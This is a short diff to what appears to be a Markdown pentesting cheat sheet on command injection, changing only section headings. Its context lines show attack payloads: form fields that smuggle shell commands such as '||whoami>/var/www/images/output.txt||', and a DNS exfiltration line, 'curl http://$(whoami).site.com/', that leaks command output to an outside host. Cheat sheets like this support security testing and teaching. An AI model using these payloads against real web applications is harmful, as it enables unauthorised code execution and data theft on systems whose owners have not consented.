@@ -16,7 +16,7 @@ seo:
   robots: "" # custom robot tags (optional)
   noindex: false # false (default) or true
 ---
-
+## Basic Command injection
 - Command Injection/Execution :
 ```sh
 #Both Unix and Windows supported
@@ -52,7 +52,7 @@ name=dede&email=test%40gmail.com||+ping+-c+10+127.0.0.1+||&subject=dede&message=
 name=test&email=||whoami>/var/www/images/output.txt||&subject=test&message=test
 ```
 
-### RCE - Exfiltrating via DNS
+## RCE - Exfiltrating via DNS
 
 ```
 curl http://$(whoami).site.com/
